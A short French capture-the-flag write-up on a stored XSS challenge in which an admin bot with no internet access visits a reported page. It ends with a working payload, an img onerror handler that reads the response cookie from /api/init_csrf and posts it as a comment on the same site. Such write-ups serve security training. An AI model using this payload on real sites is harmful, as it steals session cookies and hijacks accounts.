

![](../img/Pasted%20image%2020260517122449.png)

Dans ce challenge nous pouvons voir un petit lore sympa créé par rootcan (merci encore pour ce challenge qui ma casser la tête haha).

Nous pouvons voir que signaler un problème nous permet donc de faire cliquez ou de faire chargé la page à un administrateur(ici un bot admin) il nous ai précisé que le bot n'as accès à internet. Pour des raisons de sécurité mais aussi pour un vrai challenge bien dur haha. On va devoir donc faire ce qu'on appel du same origin et faire en sorte que le bot admin fasse tout de lui même ou soit renvoie son cookie.

Comment on peut-être sûr que ce sera le chemin du cookie à prendre ? 

Grâce à cette phrase : 

`_Signaler un problème" vous permettra d'amener un admin possédant un cookie plutôt intéressant sur la page_`







Solution finale : 


```javascript
<img src=x onerror="fetch('/api/init_csrf',{credentials:'include'}).then(r=>{var sc=r.headers.get('set-cookie');fetch('/post_comment',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'comment=SC='+encodeURIComponent(sc)})})">
```

